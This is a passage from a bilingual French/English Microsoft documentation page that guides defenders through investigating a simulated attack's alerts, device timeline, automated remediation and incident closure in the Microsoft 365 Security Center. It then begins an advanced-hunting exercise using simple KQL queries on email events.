<span data-ttu-id="10d0c-214">Dans ce scénario, le processus <i>notepad.exe</i> présente un comportement anormal, impliquant la communication avec un emplacement externe.</span><span class="sxs-lookup"><span data-stu-id="10d0c-214">For this scenario, the process <i>notepad.exe</i> is exhibiting abnormal behavior, involving communication with an external location.</span></span> <span data-ttu-id="10d0c-215">Ce résultat est indépendant de la méthode spécifique utilisée pour introduire et exécuter le code malveillant.</span><span class="sxs-lookup"><span data-stu-id="10d0c-215">This outcome is independent of the specific method used to introduce and execute the malicious code.</span></span>

>[!NOTE]
><span data-ttu-id="10d0c-216">Étant donné que cette alerte est basée sur des modèles d’apprentissage qui nécessitent un traitement principal supplémentaire, l’affichage de cette alerte dans le portail peut prendre un certain temps.</span><span class="sxs-lookup"><span data-stu-id="10d0c-216">Because this alert is based on machine-learning models that require additional backend processing, it might take some time before you see this alert in the portal.</span></span>

<span data-ttu-id="10d0c-217">Notez que les détails de l’alerte incluent l’adresse IP externe, un indicateur que vous pouvez utiliser comme tableau croisé dynamique pour développer l’enquête.</span><span class="sxs-lookup"><span data-stu-id="10d0c-217">Notice that the alert details include the external IP address—an indicator that you can use as a pivot to expand investigation.</span></span>

<span data-ttu-id="10d0c-218">Cliquez sur l’adresse IP dans l’arborescence du processus d’alerte pour afficher la page Détails de l’adresse IP.</span><span class="sxs-lookup"><span data-stu-id="10d0c-218">Click the IP address in the alert process tree to view the IP address details page.</span></span>

![Capture d’écran de l’alerte pour un comportement inattendu d’un processus exécuté sans argument de ligne de commande](../../media/mtp/fig8.png) 

<span data-ttu-id="10d0c-220">La figure suivante affiche la page de détails de l’adresse IP sélectionnée (cliquez sur adresse IP dans l’arborescence du processus d’alerte).</span><span class="sxs-lookup"><span data-stu-id="10d0c-220">The following figure displays the selected IP Address details page (clicking on IP address in the Alert process tree).</span></span>
<span data-ttu-id="10d0c-221">![Capture d’écran de la page de détails de l’adresse IP](../../media/mtp/fig9.png)</span><span class="sxs-lookup"><span data-stu-id="10d0c-221">![Screenshot of the IP address details page](../../media/mtp/fig9.png)</span></span>


<span data-ttu-id="10d0c-222">**Alerte : utilisateur et recherche d’adresses IP (SMB) (source : Azure ATP)**</span><span class="sxs-lookup"><span data-stu-id="10d0c-222">**Alert: User and IP address reconnaissance (SMB) (Source: Azure ATP)**</span></span>

<span data-ttu-id="10d0c-223">L’énumération utilisant le protocole SMB (Server Message Block) permet aux attaquants d’obtenir des informations récentes de connexion des utilisateurs qui les aident à se déplacer par la suite via le réseau pour accéder à un compte sensible spécifique.</span><span class="sxs-lookup"><span data-stu-id="10d0c-223">Enumeration using Server Message Block (SMB) protocol enables attackers to get recent user logon information that helps them move laterally through the network to access a specific sensitive account.</span></span>

<span data-ttu-id="10d0c-224">Dans ce cas, une alerte est déclenchée lorsque l’énumération de session SMB est exécutée sur un contrôleur de domaine.</span><span class="sxs-lookup"><span data-stu-id="10d0c-224">In this detection, an alert is triggered when the SMB session enumeration runs against a domain controller.</span></span>

![Capture d’écran de l’alerte Azure ATP pour la reconnaissance de l’utilisateur et de l’adresse IP](../../media/mtp/fig10.png) 


### <a name="review-the-device-timeline-microsoft-defender-atp"></a><span data-ttu-id="10d0c-226">Examiner la chronologie de l’appareil [Microsoft Defender ATP]</span><span class="sxs-lookup"><span data-stu-id="10d0c-226">Review the device timeline [Microsoft Defender ATP]</span></span>
<span data-ttu-id="10d0c-227">Après avoir exploré les différentes alertes dans cet incident, revenez à la page d’incident que vous avez examinée précédemment.</span><span class="sxs-lookup"><span data-stu-id="10d0c-227">After exploring the various alerts in this incident, navigate back to the incident page you investigated earlier.</span></span> <span data-ttu-id="10d0c-228">Cliquez sur l’onglet **appareils** de la page incident pour examiner les périphériques impliqués dans cet incident, comme indiqué par Microsoft Defender ATP et Azure ATP.</span><span class="sxs-lookup"><span data-stu-id="10d0c-228">Click the **Devices** tab in the incident page to review the devices involved in this incident as reported by Microsoft Defender ATP and Azure ATP.</span></span>

<span data-ttu-id="10d0c-229">Cliquez sur le nom du périphérique sur lequel l’attaque a été menée afin d’ouvrir la page de l’entité pour cet appareil spécifique.</span><span class="sxs-lookup"><span data-stu-id="10d0c-229">Click the name of the device where the attack was conducted, to open the entity page for that specific device.</span></span> <span data-ttu-id="10d0c-230">Dans cette page, vous pouvez voir les alertes déclenchées et les événements associés.</span><span class="sxs-lookup"><span data-stu-id="10d0c-230">In that page, you can see alerts that were triggered and related events.</span></span>

<span data-ttu-id="10d0c-231">Cliquez sur l’onglet **chronologie** pour ouvrir la chronologie de l’appareil et afficher tous les événements et comportements observés sur l’appareil dans l’ordre chronologique, en parsemés avec les alertes générées.</span><span class="sxs-lookup"><span data-stu-id="10d0c-231">Click the **Timeline** tab to open the device timeline and view all events and behaviors observed on the device in chronological order, interspersed with the alerts raised.</span></span>

![Capture d’écran de la chronologie de l’appareil avec des comportements](../../media/mtp/fig11.png) 

<span data-ttu-id="10d0c-233">Le développement d’une partie des comportements les plus intéressants fournit des informations utiles, telles que des arbres de processus.</span><span class="sxs-lookup"><span data-stu-id="10d0c-233">Expanding some of the more interesting behaviors provides useful details, such as process trees.</span></span>

<span data-ttu-id="10d0c-234">Par exemple, faites défiler vers le bas jusqu’à ce que vous trouviez l' **injection de processus suspecte d’alerte observée**.</span><span class="sxs-lookup"><span data-stu-id="10d0c-234">For example, scroll down until you find the alert event **Suspicious process injection observed**.</span></span> <span data-ttu-id="10d0c-235">Cliquez sur le **powershell.exe injecté pour notepad.exe** événement de processus ci-dessous, afin d’afficher l’arborescence de processus complète pour ce comportement sous le graphique des **entités d’événement** dans le volet latéral.</span><span class="sxs-lookup"><span data-stu-id="10d0c-235">Click the **powershell.exe injected to notepad.exe process** event below it, to display the full process tree for this behavior under the **Event entities** graph on the side pane.</span></span> <span data-ttu-id="10d0c-236">Si nécessaire, utilisez la barre de recherche pour le filtrage.</span><span class="sxs-lookup"><span data-stu-id="10d0c-236">Use the search bar for filtering if necessary.</span></span>

![Capture d’écran de l’arborescence de processus pour le comportement de création de fichier PowerShell sélectionné](../../media/mtp/fig12.png)

### <a name="review-the-user-information-microsoft-cloud-app-security"></a><span data-ttu-id="10d0c-238">Consulter les informations utilisateur [sécurité des applications Cloud Microsoft]</span><span class="sxs-lookup"><span data-stu-id="10d0c-238">Review the user information [Microsoft Cloud App Security]</span></span>

<span data-ttu-id="10d0c-239">Sur la page incident, cliquez sur l’onglet **utilisateurs** pour afficher la liste des utilisateurs impliqués dans l’attaque.</span><span class="sxs-lookup"><span data-stu-id="10d0c-239">On the incident page, click the **Users** tab to display the list of users involved in the attack.</span></span> <span data-ttu-id="10d0c-240">Le tableau contient des informations supplémentaires sur chaque utilisateur, y compris le score de **priorité** de chaque utilisateur.</span><span class="sxs-lookup"><span data-stu-id="10d0c-240">The table contains additional information about each user, including each user’s **Investigation Priority** score.</span></span>

<span data-ttu-id="10d0c-241">Cliquez sur le nom d’utilisateur pour ouvrir la page de profil de l’utilisateur dans laquelle il est possible d’effectuer des recherches plus approfondies.</span><span class="sxs-lookup"><span data-stu-id="10d0c-241">Click the username to open the user’s profile page where further investigation can be conducted.</span></span> <span data-ttu-id="10d0c-242">[En savoir plus sur l’examen des utilisateurs à risque](https://docs.microsoft.com/cloud-app-security/tutorial-ueba#identify).</span><span class="sxs-lookup"><span data-stu-id="10d0c-242">[Read more about investigating risky users](https://docs.microsoft.com/cloud-app-security/tutorial-ueba#identify).</span></span>
<br>
<span data-ttu-id="10d0c-243">![Capture d’écran de la page utilisateur de sécurité des applications Cloud](../../media/mtp/fig13.png)</span><span class="sxs-lookup"><span data-stu-id="10d0c-243">![Screenshot of Cloud App Security user page](../../media/mtp/fig13.png)</span></span>


## <a name="automated-investigation-and-remediation"></a><span data-ttu-id="10d0c-244">Investigation et résolution automatiques</span><span class="sxs-lookup"><span data-stu-id="10d0c-244">Automated investigation and remediation</span></span>
>[!NOTE]
><span data-ttu-id="10d0c-245">Avant d’aborder cette simulation, regardez la vidéo suivante pour vous familiariser avec ce qu’est la réparation automatique automatique, où la trouver dans le portail et comment elle peut vous aider dans vos opérations de sécurité :</span><span class="sxs-lookup"><span data-stu-id="10d0c-245">Before we walk you through this simulation, watch the following video to get familiar with what automated self-healing is, where to find it in the portal, and how it can help in your security operations:</span></span>

>[!VIDEO https://www.microsoft.com/en-us/videoplayer/embed/RE4BzwB]

<span data-ttu-id="10d0c-246">Revenez à l’incident dans le portail du centre de sécurité Microsoft 365.</span><span class="sxs-lookup"><span data-stu-id="10d0c-246">Navigate back to the incident in the Microsoft 365 Security Center portal.</span></span> <span data-ttu-id="10d0c-247">L’onglet **enquêtes** de la page **incident** indique les analyses automatiques déclenchées par Azure ATP et Microsoft Defender ATP.</span><span class="sxs-lookup"><span data-stu-id="10d0c-247">The **Investigations** tab in the **Incident** page shows the automated investigations that were triggered by Azure ATP and Microsoft Defender ATP.</span></span> <span data-ttu-id="10d0c-248">La capture d’écran ci-dessous affiche uniquement l’enquête automatisée déclenchée par Microsoft Defender ATP.</span><span class="sxs-lookup"><span data-stu-id="10d0c-248">The screenshot below displays only the automated investigation triggered by Microsoft Defender ATP.</span></span> <span data-ttu-id="10d0c-249">Par défaut, Microsoft Defender ATP corrige automatiquement les artefacts détectés dans la file d’attente, ce qui nécessite une correction.</span><span class="sxs-lookup"><span data-stu-id="10d0c-249">By default, Microsoft Defender ATP automatically remediates the artifacts found in the queue which requires remediation.</span></span>

![Capture d’écran de recherches automatiques liées à l’incident](../../media/mtp/fig14.png)

<span data-ttu-id="10d0c-251">Cliquez sur l’alerte qui a déclenché une enquête pour ouvrir la page des détails de l' **enquête** .</span><span class="sxs-lookup"><span data-stu-id="10d0c-251">Click the alert that triggered an investigation to open the **Investigation details** page.</span></span> <span data-ttu-id="10d0c-252">Vous verrez ce qui suit :</span><span class="sxs-lookup"><span data-stu-id="10d0c-252">You’ll see the following:</span></span>
- <span data-ttu-id="10d0c-253">Alerte (s) ayant déclenché l’enquête automatisée.</span><span class="sxs-lookup"><span data-stu-id="10d0c-253">Alert(s) that triggered the automated investigation.</span></span>
- <span data-ttu-id="10d0c-254">Utilisateurs et appareils affectés.</span><span class="sxs-lookup"><span data-stu-id="10d0c-254">Impacted users and devices.</span></span> <span data-ttu-id="10d0c-255">Si des indicateurs sont trouvés sur des appareils supplémentaires, ces périphériques supplémentaires seront également répertoriés.</span><span class="sxs-lookup"><span data-stu-id="10d0c-255">If indicators are found on additional devices, these additional devices will be listed as well.</span></span>
- <span data-ttu-id="10d0c-256">Liste de preuves.</span><span class="sxs-lookup"><span data-stu-id="10d0c-256">List of evidence.</span></span> <span data-ttu-id="10d0c-257">Entités trouvées et analysées, telles que des fichiers, des processus, des services, des pilotes et des adresses réseau.</span><span class="sxs-lookup"><span data-stu-id="10d0c-257">The entities found and analyzed, such as files, processes, services, drivers, and network addresses.</span></span> <span data-ttu-id="10d0c-258">Ces entités sont analysées pour les relations possibles avec l’alerte et classées comme bénignes ou malveillantes.</span><span class="sxs-lookup"><span data-stu-id="10d0c-258">These entities are analyzed for possible relationships to the alert and rated as benign or malicious.</span></span>
- <span data-ttu-id="10d0c-259">Menaces détectées.</span><span class="sxs-lookup"><span data-stu-id="10d0c-259">Threats found.</span></span> <span data-ttu-id="10d0c-260">Menaces connues détectées lors de l’enquête.</span><span class="sxs-lookup"><span data-stu-id="10d0c-260">Known threats that are found during the investigation.</span></span>

>[!NOTE]
><span data-ttu-id="10d0c-261">En fonction de la temporisation, l’analyse automatisée peut toujours être en cours d’exécution.</span><span class="sxs-lookup"><span data-stu-id="10d0c-261">Depending on timing, the automated investigation might still be running.</span></span> <span data-ttu-id="10d0c-262">Patientez quelques minutes avant que le processus se termine avant de collecter et d’analyser les preuves et de passer en revue les résultats.</span><span class="sxs-lookup"><span data-stu-id="10d0c-262">Wait a few minutes for the process to complete before you collect and analyze the evidence and review the results.</span></span> <span data-ttu-id="10d0c-263">Actualisez la page des détails de l' **enquête** pour obtenir les dernières conclusions.</span><span class="sxs-lookup"><span data-stu-id="10d0c-263">Refresh the **Investigation details** page to get the latest findings.</span></span>

![Capture d’écran de la page des détails de l’enquête](../../media/mtp/fig15.png)

<span data-ttu-id="10d0c-265">Lors de l’analyse automatisée, Microsoft Defender ATP a identifié le processus d' notepad.exe, qui a été injecté sous la forme d’un des artefacts qui nécessitent une correction.</span><span class="sxs-lookup"><span data-stu-id="10d0c-265">During the automated investigation, Microsoft Defender ATP identified the notepad.exe process, which was injected as one of the artifacts requiring remediation.</span></span> <span data-ttu-id="10d0c-266">Microsoft Defender ATP arrête automatiquement l’injection de processus suspect dans le cadre de la correction automatisée.</span><span class="sxs-lookup"><span data-stu-id="10d0c-266">Microsoft Defender ATP automatically stops the suspicious process injection as part of the automated remediation.</span></span> 

<span data-ttu-id="10d0c-267">Vous pouvez voir <i>notepad.exe</i> disparaissent de la liste des processus en cours d’exécution sur le périphérique de test.</span><span class="sxs-lookup"><span data-stu-id="10d0c-267">You can see <i>notepad.exe</i> disappear from the list of running processes on the test device.</span></span>

## <a name="resolve-the-incident"></a><span data-ttu-id="10d0c-268">Résoudre l’incident</span><span class="sxs-lookup"><span data-stu-id="10d0c-268">Resolve the incident</span></span>

<span data-ttu-id="10d0c-269">Une fois l’enquête terminée et confirmée pour être résolue, fermez l’incident.</span><span class="sxs-lookup"><span data-stu-id="10d0c-269">After the investigation is complete and confirmed to be remediated, close the incident.</span></span>

<span data-ttu-id="10d0c-270">Cliquez sur **gérer l’incident**.</span><span class="sxs-lookup"><span data-stu-id="10d0c-270">Click **Manage incident**.</span></span> <span data-ttu-id="10d0c-271">Définissez l’État pour **résoudre l’incident** et sélectionnez la classification appropriée.</span><span class="sxs-lookup"><span data-stu-id="10d0c-271">Set the status to **Resolve incident** and select the relevant classification.</span></span>

<span data-ttu-id="10d0c-272">Une fois l’incident résolu, il ferme toutes les alertes associées dans le centre de sécurité Microsoft 365 et dans les portails associés.</span><span class="sxs-lookup"><span data-stu-id="10d0c-272">Once the incident is resolved, it will close all of the associated alerts in Microsoft 365 Security Center and in the related portals.</span></span>

![Capture d’écran de la page incidents avec le panneau de l’incident ouvrir gérer où vous pouvez cliquer sur le commutateur pour résoudre l’incident](../../media/mtp/fig16.png) 

<br>
<span data-ttu-id="10d0c-274">Cela inclut la simulation d’attaque pour la gestion des incidents et des scénarios d’enquête et de correction automatisés.</span><span class="sxs-lookup"><span data-stu-id="10d0c-274">This wraps up the attack simulation for the incident management and automated investigation and remediation scenarios.</span></span> <span data-ttu-id="10d0c-275">La prochaine simulation vous permettra d’effectuer une chasse aux fichiers potentiellement malveillants.</span><span class="sxs-lookup"><span data-stu-id="10d0c-275">The next simulation will take you through proactive threat hunting for potentially-malicious files.</span></span> 

## <a name="advanced-hunting-scenario"></a><span data-ttu-id="10d0c-276">Scénario de chasse avancé</span><span class="sxs-lookup"><span data-stu-id="10d0c-276">Advanced hunting scenario</span></span>

>[!NOTE]
><span data-ttu-id="10d0c-277">Avant de vous guider tout au long de la simulation, regardez la vidéo suivante pour comprendre les concepts avancés de la chasse, reportez-vous à la rubrique où se trouve le portail et découvrez comment il peut vous aider dans vos opérations de sécurité :</span><span class="sxs-lookup"><span data-stu-id="10d0c-277">Before we walk you through the simulation, watch the following video to understand the advanced hunting concepts, see where you can find it in the portal, and know how it can help you in your security operations:</span></span>

>[!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bp7O]

### <a name="hunting-environment-requirements"></a><span data-ttu-id="10d0c-278">Conditions requises pour l’environnement de la chasse</span><span class="sxs-lookup"><span data-stu-id="10d0c-278">Hunting environment requirements</span></span>
<span data-ttu-id="10d0c-279">Il existe une seule boîte aux lettres interne et un seul périphérique requis pour ce scénario.</span><span class="sxs-lookup"><span data-stu-id="10d0c-279">There is a single internal mailbox and device required for this scenario.</span></span> <span data-ttu-id="10d0c-280">Vous aurez également besoin d’un compte de messagerie externe pour envoyer le message de test.</span><span class="sxs-lookup"><span data-stu-id="10d0c-280">You will also need an external email account to send the test message.</span></span>

1.  <span data-ttu-id="10d0c-281">Vérifiez que votre client a [activé la protection contre les menaces Microsoft](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service).</span><span class="sxs-lookup"><span data-stu-id="10d0c-281">Verify that your tenant has [enabled Microsoft Threat Protection](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service).</span></span>
2.  <span data-ttu-id="10d0c-282">Identifiez une boîte aux lettres cible à utiliser pour la réception du courrier électronique.</span><span class="sxs-lookup"><span data-stu-id="10d0c-282">Identify a target mailbox to be used for receiving email.</span></span>
    <span data-ttu-id="10d0c-283">a.</span><span class="sxs-lookup"><span data-stu-id="10d0c-283">a.</span></span>  <span data-ttu-id="10d0c-284">Cette boîte aux lettres doit être surveillée par Office 365 ATP b.</span><span class="sxs-lookup"><span data-stu-id="10d0c-284">This mailbox must be monitored by Office 365 ATP b.</span></span>  <span data-ttu-id="10d0c-285">L’appareil de la condition 3 requise doit accéder à cette boîte aux lettres.</span><span class="sxs-lookup"><span data-stu-id="10d0c-285">The device from requirement 3 needs to access this mailbox</span></span>
3.  <span data-ttu-id="10d0c-286">Configurez un périphérique de test : a.</span><span class="sxs-lookup"><span data-stu-id="10d0c-286">Configure a test device: a.</span></span>  <span data-ttu-id="10d0c-287">Assurez-vous que vous utilisez Windows 10 version 1903 ou une version ultérieure.</span><span class="sxs-lookup"><span data-stu-id="10d0c-287">Make sure you are using Windows 10 version 1903 or later version.</span></span>
    <span data-ttu-id="10d0c-288">b.</span><span class="sxs-lookup"><span data-stu-id="10d0c-288">b.</span></span>  <span data-ttu-id="10d0c-289">Joignez le périphérique de test au domaine de test.</span><span class="sxs-lookup"><span data-stu-id="10d0c-289">Join the test device to the test domain.</span></span>
    <span data-ttu-id="10d0c-290">c.</span><span class="sxs-lookup"><span data-stu-id="10d0c-290">c.</span></span>  <span data-ttu-id="10d0c-291">[Activez l’antivirus Windows Defender](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features).</span><span class="sxs-lookup"><span data-stu-id="10d0c-291">[Turn on Windows Defender Antivirus](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features).</span></span> <span data-ttu-id="10d0c-292">Si vous rencontrez des problèmes pour activer l’antivirus Windows Defender, consultez [cette rubrique de résolution des problèmes](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).</span><span class="sxs-lookup"><span data-stu-id="10d0c-292">If you are having trouble enabling Windows Defender Antivirus, see [this troubleshooting topic](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).</span></span>
    <span data-ttu-id="10d0c-293">d.</span><span class="sxs-lookup"><span data-stu-id="10d0c-293">d.</span></span>  <span data-ttu-id="10d0c-294">[Intégration à Microsoft Defender-protection avancée contre les menaces (MDATP)](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).</span><span class="sxs-lookup"><span data-stu-id="10d0c-294">[Onboard to Microsoft Defender Advanced Threat Protection (MDATP)](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).</span></span>

### <a name="run-the-simulation"></a><span data-ttu-id="10d0c-295">Exécuter la simulation</span><span class="sxs-lookup"><span data-stu-id="10d0c-295">Run the simulation</span></span>
1.  <span data-ttu-id="10d0c-296">À partir d’un compte de messagerie externe, envoyez un message électronique à la boîte aux lettres identifiée à l’étape 2 de la section Configuration de l’environnement de test.</span><span class="sxs-lookup"><span data-stu-id="10d0c-296">From an external email account, send an email to the mailbox identified in step 2 of the test environment requirements section.</span></span> <span data-ttu-id="10d0c-297">Inclure une pièce jointe qui sera autorisée via les stratégies de filtrage du courrier électronique existantes.</span><span class="sxs-lookup"><span data-stu-id="10d0c-297">Include an attachment that will be allowed through any existing email filter policies.</span></span>  <span data-ttu-id="10d0c-298">Il n’est pas nécessaire qu’il s’agit d’un fichier malveillant ou d’un exécutable.</span><span class="sxs-lookup"><span data-stu-id="10d0c-298">This file does not need to be malicious or an executable.</span></span> <span data-ttu-id="10d0c-299">Les types de fichiers suggérés sont <i>. pdf</i>, <i>. exe</i> (si autorisé) ou document Office tel qu’un fichier Word.</span><span class="sxs-lookup"><span data-stu-id="10d0c-299">Suggested file types are <i>.pdf</i>, <i>.exe</i> (if allowed), or Office document such as a Word file.</span></span>
2.  <span data-ttu-id="10d0c-300">Ouvrez le courrier électronique envoyé à partir de l’appareil configuré comme défini à l’étape 3 de la section Configuration de l’environnement de test.</span><span class="sxs-lookup"><span data-stu-id="10d0c-300">Open the sent email from the device configured as defined in step 3 of the test environment requirements section.</span></span> <span data-ttu-id="10d0c-301">Ouvrez la pièce jointe ou enregistrez le fichier sur l’appareil.</span><span class="sxs-lookup"><span data-stu-id="10d0c-301">Either open the attachment or save the file to the device.</span></span>


<span data-ttu-id="10d0c-302">**Trouver la chasse**</span><span class="sxs-lookup"><span data-stu-id="10d0c-302">**Go hunting**</span></span>
1.  <span data-ttu-id="10d0c-303">Ouvrez le portail security.microsoft.com.</span><span class="sxs-lookup"><span data-stu-id="10d0c-303">Open the security.microsoft.com portal.</span></span>
2.  <span data-ttu-id="10d0c-304">Naviguez jusqu’à la **chasse > la chasse avancée**.</span><span class="sxs-lookup"><span data-stu-id="10d0c-304">Navigate to **Hunting > Advanced hunting**.</span></span>

    ![Capture d’écran de la chasse avancée dans la barre de navigation du portail du centre de sécurité M365](../../media/mtp/fig17.png) 

3.  <span data-ttu-id="10d0c-306">Créer une requête qui commence par collecter des événements de messagerie.</span><span class="sxs-lookup"><span data-stu-id="10d0c-306">Build a query that starts by gathering email events.</span></span>
    <span data-ttu-id="10d0c-307">a.</span><span class="sxs-lookup"><span data-stu-id="10d0c-307">a.</span></span>  <span data-ttu-id="10d0c-308">Dans le volet requête, sélectionnez Nouveau.</span><span class="sxs-lookup"><span data-stu-id="10d0c-308">From the query pane, select New.</span></span>
    <span data-ttu-id="10d0c-309">b.</span><span class="sxs-lookup"><span data-stu-id="10d0c-309">b.</span></span>  <span data-ttu-id="10d0c-310">Double-cliquez sur la table EmailEvents dans le schéma.</span><span class="sxs-lookup"><span data-stu-id="10d0c-310">Double-click on the EmailEvents table from the schema.</span></span>

```
EmailEvents 
```                                        

   <span data-ttu-id="10d0c-311">c.</span><span class="sxs-lookup"><span data-stu-id="10d0c-311">c.</span></span>   <span data-ttu-id="10d0c-312">Définissez le délai sur les dernières 24 heures.</span><span class="sxs-lookup"><span data-stu-id="10d0c-312">Change the time frame to the last 24 hours.</span></span> <span data-ttu-id="10d0c-313">En supposant que le courrier électronique que vous avez envoyé lors de l’exécution de la simulation ci-dessus était au cours des dernières 24 heures, sinon, modifiez le délai.</span><span class="sxs-lookup"><span data-stu-id="10d0c-313">Assuming the email you sent when you ran the simulation above was in the past 24 hours, otherwise change the time frame.</span></span>
   <span data-ttu-id="10d0c-314">![Capture d’écran de l’endroit où vous pouvez modifier le délai.</span><span class="sxs-lookup"><span data-stu-id="10d0c-314">![Screenshot of where you can change the time frame.</span></span> <span data-ttu-id="10d0c-315">Ouvrir le menu déroulant pour choisir parmi les options de période de temps](../../media/mtp/fig18.png)</span><span class="sxs-lookup"><span data-stu-id="10d0c-315">Open the drop-down menu to choose from range of time frame options](../../media/mtp/fig18.png)</span></span> 


   <span data-ttu-id="10d0c-316">d.</span><span class="sxs-lookup"><span data-stu-id="10d0c-316">d.</span></span>   <span data-ttu-id="10d0c-317">Exécutez la requête.</span><span class="sxs-lookup"><span data-stu-id="10d0c-317">Run the query.</span></span>  <span data-ttu-id="10d0c-318">Vous pouvez avoir un grand nombre de résultats en fonction de l’environnement du pilote.</span><span class="sxs-lookup"><span data-stu-id="10d0c-318">You may have many results depending on the environment for the pilot.</span></span>  

>[!NOTE]
><span data-ttu-id="10d0c-319">Pour limiter le nombre de données, consultez l’étape suivante pour les options de filtrage.</span><span class="sxs-lookup"><span data-stu-id="10d0c-319">See the next step for filtering options to limit data return.</span></span>

   ![Capture d’écran des résultats de la recherche avancée de la chasse](../../media/mtp/fig19.png) 

>[!NOTE]
><span data-ttu-id="10d0c-321">La chasse avancée affiche les résultats de la requête sous forme de données tabulaires.</span><span class="sxs-lookup"><span data-stu-id="10d0c-321">Advanced hunting displays query results as tabular data.</span></span> <span data-ttu-id="10d0c-322">Vous pouvez également choisir d’afficher les données dans d’autres types de formats, tels que des graphiques.</span><span class="sxs-lookup"><span data-stu-id="10d0c-322">You can also opt to view the data in other format types such as charts.</span></span>    

   <span data-ttu-id="10d0c-323">e.</span><span class="sxs-lookup"><span data-stu-id="10d0c-323">e.</span></span>   <span data-ttu-id="10d0c-324">Examinez les résultats et vérifiez si vous pouvez identifier le courrier électronique que vous avez ouvert.</span><span class="sxs-lookup"><span data-stu-id="10d0c-324">Look at the results and see if you can identify the email you opened.</span></span>  <span data-ttu-id="10d0c-325">Le message peut prendre jusqu’à 2 heures pour apparaître dans la chasse avancée.</span><span class="sxs-lookup"><span data-stu-id="10d0c-325">It may take up to 2 hours for the message to show up in advanced hunting.</span></span> <span data-ttu-id="10d0c-326">Si l’environnement de messagerie est volumineux et qu’il existe de nombreux résultats, vous pouvez utiliser l' **option Afficher les filtres** pour rechercher le message.</span><span class="sxs-lookup"><span data-stu-id="10d0c-326">If the email environment is large and there are many results, you might want to use the **Show Filters option** to find the message.</span></span> 

   <span data-ttu-id="10d0c-327">Dans l’exemple, le courrier électronique a été envoyé à partir d’un compte Yahoo.</span><span class="sxs-lookup"><span data-stu-id="10d0c-327">In the sample, the email was sent from a Yahoo account.</span></span> <span data-ttu-id="10d0c-328">Cliquez sur l' **+** icône située en regard de **yahoo.com** sous la section SenderFromDomain, puis cliquez sur **appliquer** pour ajouter le domaine sélectionné à la requête.</span><span class="sxs-lookup"><span data-stu-id="10d0c-328">Click the **+** icon beside **yahoo.com** under the SenderFromDomain section and then click **Apply** to add the selected domain to the query.</span></span>  <span data-ttu-id="10d0c-329">Vous devez utiliser le domaine ou le compte de messagerie qui a été utilisé pour envoyer le message de test à l’étape 1 de l’exécution de la simulation pour filtrer vos résultats.</span><span class="sxs-lookup"><span data-stu-id="10d0c-329">You should use the domain or email account that was used to send the test message in step 1 of Run the Simulation to filter your results.</span></span>  <span data-ttu-id="10d0c-330">Exécutez à nouveau la requête pour obtenir un jeu de résultats plus petit afin de vérifier que le message a été affiché à partir de la simulation.</span><span class="sxs-lookup"><span data-stu-id="10d0c-330">Run the query again to get a smaller result set to verify that you see the message from the simulation.</span></span>
   
   ![Capture d’écran des filtres.](../../media/mtp/fig20.png) 


```
EmailEvents 
| where SenderMailFromDomain == "yahoo.com"
```

   <span data-ttu-id="10d0c-333">f.</span><span class="sxs-lookup"><span data-stu-id="10d0c-333">f.</span></span>   <span data-ttu-id="10d0c-334">Cliquez sur les lignes résultantes à partir de la requête afin de pouvoir inspecter l’enregistrement.</span><span class="sxs-lookup"><span data-stu-id="10d0c-334">Click the resulting rows from the query so you can inspect the record.</span></span>
   <span data-ttu-id="10d0c-335">![Capture d’écran du volet latéral enregistrement Inspect qui s’ouvre lorsqu’un résultat de la chasse avancée est sélectionné](../../media/mtp/fig21.png)</span><span class="sxs-lookup"><span data-stu-id="10d0c-335">![Screenshot of the inspect record side panel which opens up when an advanced hunting result is selected](../../media/mtp/fig21.png)</span></span> 


4.  <span data-ttu-id="10d0c-336">Maintenant que vous avez vérifié que vous pouvez voir le message, ajoutez un filtre pour les pièces jointes.</span><span class="sxs-lookup"><span data-stu-id="10d0c-336">Now that you have verified that you can see the email, add a filter for the attachments.</span></span> <span data-ttu-id="10d0c-337">Concentrez-vous sur tous les messages électroniques contenant des pièces jointes dans l’environnement.</span><span class="sxs-lookup"><span data-stu-id="10d0c-337">Focus on all emails with attachments in the environment.</span></span> <span data-ttu-id="10d0c-338">Pour ce scénario, concentrez-vous sur les messages électroniques entrants, et non sur ceux qui sont envoyés à partir de votre environnement.</span><span class="sxs-lookup"><span data-stu-id="10d0c-338">For this scenario, focus on inbound emails, not those that are being sent out from your environment.</span></span> <span data-ttu-id="10d0c-339">Supprimez tous les filtres que vous avez ajoutés pour localiser votre message et ajouter «| où **AttachmentCount > 0** et **EmailDirection**«  ==  **entrant** »</span><span class="sxs-lookup"><span data-stu-id="10d0c-339">Remove any filters you have added to locate your message and add “| where **AttachmentCount > 0** and **EmailDirection** == **“Inbound””**</span></span>

<span data-ttu-id="10d0c-340">La requête suivante vous indique le résultat avec une liste plus courte que votre requête initiale pour tous les événements de messagerie :</span><span class="sxs-lookup"><span data-stu-id="10d0c-340">The following query will show you the result with a shorter list than your initial query for all email events:</span></span>

```
EmailEvents 
| where AttachmentCount > 0 and EmailDirection == "Inbound"

```

5.  <span data-ttu-id="10d0c-341">Ensuite, incluez les informations relatives à la pièce jointe (par exemple, le nom de fichier, les hachages) à votre jeu de résultats.</span><span class="sxs-lookup"><span data-stu-id="10d0c-341">Next, include the information about the attachment (such as: file name, hashes) to your result set.</span></span> <span data-ttu-id="10d0c-342">Pour ce faire, rejoignez la table **EmailAttachmentInfo** .</span><span class="sxs-lookup"><span data-stu-id="10d0c-342">To do so, join the **EmailAttachmentInfo** table.</span></span> <span data-ttu-id="10d0c-343">Les champs communs à utiliser pour la jointure, dans ce cas, sont **NetworkMessageId** et **RecipientObjectId**.</span><span class="sxs-lookup"><span data-stu-id="10d0c-343">The common fields to use for joining, in this case are **NetworkMessageId** and **RecipientObjectId**.</span></span>

